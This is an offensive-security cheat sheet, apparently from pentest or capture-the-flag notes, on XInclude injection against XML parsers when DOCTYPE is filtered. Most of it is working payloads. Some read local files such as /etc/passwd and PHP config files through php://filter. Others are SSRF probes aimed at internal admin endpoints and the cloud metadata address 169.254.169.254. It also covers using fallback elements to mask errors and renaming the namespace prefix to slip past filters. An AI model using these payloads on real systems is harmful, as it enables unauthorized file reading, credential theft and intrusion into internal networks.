# XInclude — the escape when DOCTYPE is forbidden

## When to use it

`DOCTYPE` stripped or rejected → entities impossible → **XInclude**
needs no DOCTYPE at all — it's a namespaced element any parser with
XInclude support expands.

```xml
<data xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</data>
```

- `parse="text"` — include as literal text (file contents → safe chars)
- `parse="xml"` — include as XML (default)
- `href` — `file://`, `http://`, `php://filter/...`, `jar:`, `ftp://`

## The fallback element — error masking

```xml
<xi:include href="file:///flag" parse="text">
  <xi:fallback>missing</xi:fallback>
</xi:include>
```

`xi:fallback` content is used if the include fails — hides errors.

## Where XInclude support lives — parser matrix

| Parser | XInclude default |
|---|---|
| Java Xerces `DocumentBuilderFactory` | `setXIncludeAware(true)` — off by default, often ON in frameworks |
| Java SAX | `SAXParserFactory.setXIncludeAware` |
| .NET `XmlReader` | NOT built-in — `XmlIncludeReader` in Mvp.Xml lib |
| Python lxml | `tree.xinclude()` — explicit call — enabled when app calls it |
| Python ElementTree | no native XInclude |
| PHP libxml2 | `LIBXML_XINCLUDE` opt / `DOMDocument->xinclude()` |
| libxml2-based everything | `xmlXIncludeProcess` — used in Nokogiri/Rexml? Nokogiri `xinclude` option |

XInclude support is app-explicit — hit rate lower than entity
resolution, but it's THE door when DOCTYPE is filtered.

## The href protocols — same as entities

```
file:///etc/passwd
file:///flag
http://internal/admin
php://filter/convert.base64-encode/resource=/var/www/config.php
jar:http://x!/file
ftp://x/file
```

## Framing the probe — inside the endpoint's expected root

The endpoint expects a doc shaped like its normal input — put the
`xi:include` INSIDE the element it reads:

```xml
<order xmlns:xi="http://www.w3.org/2001/XInclude">
  <item><xi:include href="file:///etc/passwd" parse="text"/></item>
</order>
```

The included text lands where the element's text would — echo'd like
normal input.

## XInclude for SSRF — `parse="xml"` + `http://`

```xml
<xi:include href="http://internal/admin" parse="xml"/>
<xi:include href="http://169.254.169.254/latest/meta-data/" parse="text"/>
```

`parse="xml"` on internal endpoints that return XML — response merged
into the doc — `ssrf-via-xxe.md`.

## The `xpointer` attribute — fragment selection

```xml
<xi:include href="doc.xml" xpointer="xpointer(/root/secret)"/>
```

`xpointer` selects a fragment — for reading specific nodes of a known
XML config file.

## The namespace prefix variations

`xmlns:xi="http://www.w3.org/2001/XInclude"` — the URI is fixed; the
prefix `xi` is conventional but can be anything — `xmlns:foo="...XInclude"`:
`<foo:include .../>` — evades naive `xi:include` text filters.

## The "DOCTPYE stripped but parser is libxml2" — a second door

libxml2-based parsers (PHP DOM/SimpleXML, Python lxml, Ruby Nokogiri)
often ship XInclude processors — the app might call `xinclude()` on
the loaded tree — your `<xi:include>` fires without any DOCTYPE.

## Falsifiers

- parser has no XInclude processing AND DOCTYPE is stripped — both
  doors closed → record "XML parser hardened" and switch class
